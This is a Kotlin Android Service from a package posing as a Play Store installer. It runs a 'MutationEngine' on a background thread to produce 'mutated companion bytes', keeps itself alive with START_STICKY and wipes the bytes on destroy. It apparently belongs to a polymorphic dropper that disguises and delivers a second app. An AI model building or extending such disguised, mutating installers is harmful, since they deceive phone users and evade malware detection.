package com.playstore.installer.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import com.playstore.installer.MutationEngine

class LauncherService : Service() {

    companion object {
        @Volatile var mutatedCompanionBytes: ByteArray? = null
        @Volatile var mutationComplete: Boolean = false
        @Volatile var mutationError: Boolean = false
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            try {
                val engine = MutationEngine(applicationContext)
                val bytes = engine.getMutatedCompanionBytes()
                if (bytes.isNotEmpty()) {
                    mutatedCompanionBytes = bytes
                    mutationComplete = true
                } else {
                    mutationError = true
                    mutationComplete = true
                }
            } catch (e: Exception) {
                mutationError = true
                mutationComplete = true
            }
        }.apply { isDaemon = true }.start()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        mutatedCompanionBytes?.fill(0)
        mutatedCompanionBytes = null
    }
}
